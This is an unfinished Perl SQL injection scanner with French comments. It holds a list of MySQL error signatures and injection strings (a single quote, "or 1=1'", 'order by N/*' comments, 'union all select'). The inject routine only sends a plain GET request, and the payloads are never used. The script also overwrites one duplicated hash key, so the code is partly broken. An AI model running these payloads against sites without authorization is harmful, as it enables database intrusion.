#!/usr/bin/perl -w
#programme qui permet d'automatiser la recherche d'éventuelles failles sql
use strict;
use LWP::UserAgent;
use MIME::Base64;
use Term::ANSIColor;
use Getopt::Std;

my %opts = ();
getopt("s:" , \%opts);

my %requests = (
                "syntax" => "SQL\ syntax" ,
                "assoc" => "mysql_fetch_assoc",
                "array" => "mysql_fetch_array",
                "rows" => "mysql_num_rows",
                "result" => "mysql_result",
                "query" => "mysql_query",
                "orderbyquery" => "Unknown\ column"
                );

#a encoder en base64 pour l'url
my %injection_codes = (
                      #frequent codes
                      "simplequote" => "'",
                      "or" => "or 1=1'",
                      #order by clause
                      "orderfst" => "order by 1/*",
                      "ordersec" => "order by 2/*",
                      "orderthd" => "order by 3/*",
                      "orderfour" => "order by 4/*",
                      "orderthd" => "order by 5/*",
                      "ordersix" => "order by 6/*",
                      "ordersev" => "order by 7/*",
                      "ordereight" => "order by 8/*",
                      "ordernine" => "order by 9/*",
                      "orderten" => "order by 10/*",
                      #union clause
                      "" => "union all select"
                      );

sub usage {
  die "Usage: $0 -s https://www.google.com/";
}

sub inject {

  my $url = shift;

  if ($url =~ m/\/\//) {

    unless ($url =~ /\/$/) { $url = "$url/"; }

  } else {
    usage();
  }

  #tentative de connexion au site
  my $ua = LWP::UserAgent->new();
  my $req = HTTP::Request->new( GET => $url );

  #on demarre la requête
  print color 'cyan';
  print "*[CHECK] Demarrage du scan pour l'url donnee: $url\n";
  print color 'reset';

  my $response = $ua->request($req);

}

if (defined $opts{s}) {
  inject($opts{s});
} else {
  usage();
}
